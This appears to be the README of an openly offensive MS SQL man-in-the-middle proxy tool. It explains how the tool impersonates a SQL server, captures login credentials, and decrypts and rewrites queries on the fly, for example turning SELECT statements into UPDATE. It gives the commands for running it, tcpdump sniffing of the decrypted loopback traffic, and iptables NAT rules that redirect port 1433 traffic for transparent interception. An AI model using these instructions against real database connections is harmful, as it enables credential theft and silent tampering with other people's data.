# MITM SQL proxy

Tool for MS SQL Man In The Middle attack. 

## How it works:
It listens for connection pretending to be a real MS SQL server, decrypts traffic to obtain credentials or manipulate the queries and connect back to real SQL server and forward traffic.

In the future also server emulation option is planned - no SQL server will be needed to obtain credentials from the client.

## Easy sniffing
To allow easy sniffing decrypted traffic by default is passing by loop on 127.0.0.1:1434
```
tcpdump -i lo port 1434 -X
```
## Easy queries manipulation
Traffic can be also easy redirected to some other middle application to manipulate queries. It needs to listen on some port, manipulate the data and send it back to some other port. All processed data is already decrypted.

As example *manipulation_example.py3* show how to change all SELECT queries to UPDATE on-the-fly:
```
./mitmsqlproxy.py 192.168.123.2 -d -lcp 1444 &

./manipulation_example.py
```

## No certificate needed
Self-signed certificate is generated on the fly. For default configuration of SQL libraries, it will work (only login packet is encrypted).
If on client side full encryption is forced ("Encrypt connection" is selected or "Encrypt=true;" is present in the connection string) **it will work only when "Trust server certificate" is selected or 'TrustServerCertificate=true' is in connection string**.

If needed custom user cert can be loaded from a file.

## Transparent traffic redirection 
If traffic goes through the machine interface it can be redirected to listening port with iptables like this:
```
sysctl net.ipv4.ip_forward=1 
iptables -t nat -A PREROUTING -p tcp --dport 1433 -j DNAT --to-destination 127.0.0.1:1433
```

## Command line options
```
usage: mitmsqlproxy.py [-h] [-port PORT] [-lport LPORT] [-q | -d | -dd] [-ll ip_address] [-llp port]
                       [-lc ip_address] [-lcp port] [--disable-loop] [--cert my.crt] [--key my.key]
                       target

MSSQL MITM proxy (SSL supported).

positional arguments:
  target          MSSQL server name or address

options:
  -h, --help      show this help message and exit
  -port PORT      MSSQL server port (default 1433)
  -lport LPORT    local listening port (default 1433)
  -q              quiet mode
  -d              show more info
  -dd             show debug info

Internal connection loop - decrypted data is sent to certain port (default 127.0.0.1:1434) and coming back to mitmslqproxy to be encrypted and send further. This option allows to sniff or even modify unencrypted SQL traffic in the fly with third party application:
  -ll ip_address  loop listening address (default 127.0.0.1)
  -llp port       loop listening address port (default 1434)
  -lc ip_address  loop connecting address (default 127.0.0.1)
  -lcp port       loop connecting address port (default 1434)
  --disable-loop  disable internal loop - if both sides will negotiate encryption sniffing will be
                  useless, only credentials will be shown on console (raw data only in debug mode)

TLS custom private key and certificate (by default it is dynamically generated):
  --cert my.crt   certificate file
  --key my.key    private key file
```
